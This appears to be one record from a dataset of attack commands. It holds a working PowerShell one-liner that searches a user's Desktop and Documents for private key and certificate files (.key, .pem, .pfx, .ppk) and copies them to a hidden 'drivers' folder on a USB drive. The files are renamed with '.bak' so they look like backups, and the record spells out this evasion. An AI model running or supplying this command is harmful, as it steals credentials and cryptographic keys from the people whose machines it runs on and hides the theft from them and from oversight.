command: $usb=(Get-Volume -DriveType Removable | Select -First 1 -ExpandProperty DriveLetter)+':\'; $dst=Join-Path $usb 'drivers'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden'; Get-ChildItem -Path "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents" -Include *.key,*.pem,*.pfx,*.ppk -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName (Join-Path $dst ($_.Name + '.bak')) -Force }
explanation: Searches for key material and copies it to a hidden folder on the USB using Copy-Item, appending a .bak extension to look like backups.
rationale_steps: Copy to USB via Copy-Item with benign-looking extensions
